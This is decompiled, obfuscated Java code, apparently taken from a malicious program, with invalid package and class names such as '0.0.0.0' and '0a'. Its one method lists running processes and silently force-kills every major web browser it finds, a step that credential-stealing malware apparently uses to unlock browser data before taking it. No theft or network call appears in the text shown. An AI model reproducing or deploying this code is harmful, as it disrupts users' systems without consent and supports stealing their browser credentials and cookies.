package 0.0.0.0;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class 0a {
   public static void _/* $FF was: 0*/() {
      String[] blacklistedProcceses = new String[]{"chrome.exe", "msedge.exe", "opera.exe", "firefox.exe", "browser.exe", "operagx.exe", "brave.exe", "edge.exe"};
      StringBuilder builder = new StringBuilder();

      try {
         BufferedReader reader = new BufferedReader(new InputStreamReader((new ProcessBuilder(new String[]{"tasklist"})).start().getInputStream()));

         while(true) {
            String line;
            String var10000 = line = reader.readLine();

            try {
               if (var10000 == null) {
                  break;
               }

               builder.append(line).append("\n");
            } catch (IOException var11) {
               throw var11;
            }
         }
      } catch (IOException var12) {
      }

      String processes = builder.toString();

      try {
         String[] var14 = blacklistedProcceses;
         int var4 = blacklistedProcceses.length;

         for(int var5 = 0; var5 < var4; ++var5) {
            String process = var14[var5];
            if (processes.contains(process)) {
               ProcessBuilder pb = new ProcessBuilder(new String[]{"taskkill", "/F", "/IM", process});
               pb.start();

               try {
                  Thread.sleep(2000L);
               } catch (InterruptedException var9) {
               }
            }
         }
      } catch (IOException var10) {
      }

   }
}
